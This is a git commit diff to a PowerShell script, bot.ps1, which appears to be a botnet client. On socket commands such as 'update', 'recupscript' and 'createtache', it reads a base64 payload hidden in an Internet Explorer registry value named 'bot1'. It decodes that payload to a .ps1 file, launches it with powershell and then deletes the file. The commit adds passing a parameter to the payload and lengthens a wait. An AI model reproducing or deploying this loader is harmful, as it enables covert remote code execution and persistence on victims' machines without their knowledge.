c742e3bbbd066526b08cd945946b5d943aa24cc6
theurtebize <t.heurtebize@outlook.com>
2020-02-16 15:54:39 +0100

    Update bot.ps1

--- bot.ps1
+++ bot.ps1
@@ -1,14 +1,12 @@
 import-module "C:\lib\script1.ps1" -force
 
-
-$cle = "bot1"
-
 function global:FRX_Socket-MessageAction{
     param($message)
     $stop = $false
     switch ($message) {
         {$_ -match "update"}{
             write-host "update en cours" -ForegroundColor green
+            $message = $option
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
             $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File C:\update.ps1 
             start powershell.exe ./update.ps1 
@@ -18,6 +16,7 @@ function global:FRX_Socket-MessageAction{
             }
         {$_ -match "recupscript"       }{
             write-host "récupération du script en cours" -ForegroundColor green
+            $message = $option
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
             $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\recup.ps1
             start powershell.exe ./recup.ps1
@@ -28,10 +27,11 @@ function global:FRX_Socket-MessageAction{
             }
         {$_ -match "createtache"       }{
             write-host "création de la tâche en cours" -ForegroundColor green
+            $message = $option
             $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
             $Decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64)) | Out-File c:\tache.ps1
-            start powershell.exe ./tache.ps1
-            Start-Sleep -s 15
+            start powershell.exe ./tache.ps1 $option
+            Start-Sleep -s 60
             rm c:\tache.ps1 # envoyer en paramètre la fonction.
             
             }
